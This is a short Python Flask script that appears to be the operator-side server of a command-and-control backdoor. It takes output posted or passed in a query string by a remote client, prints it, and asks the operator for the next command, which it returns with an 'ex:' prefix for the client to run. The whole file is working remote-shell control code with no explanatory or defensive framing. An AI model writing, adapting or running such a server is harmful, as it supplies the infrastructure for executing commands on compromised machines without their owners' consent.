from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST', 'GET'])
def handle_post():
    # Handle POST request
    if request.method == 'POST':
        output = request.form.get('output')
        if output != "nuthin":
            print("Received output: \n", output)
            command = input("\nEnter a command: ")
            return f"ex:{command}"


        else:
            command = input("\nEnter a command: ")
            return f"ex:{command}"
    elif request.method == 'GET':
        output = request.args.get('output')
        if output != "nuthin":
            print("Received output: \n", output)
            command = input("\nEnter a command: ")
            return f"ex:{command}"
        else:
            print(f"Received output:\n {output} \n")
            command = input("\nEnter a command: ")
            return f"ex:{command}"
if __name__ == '__main__':
    app.run()
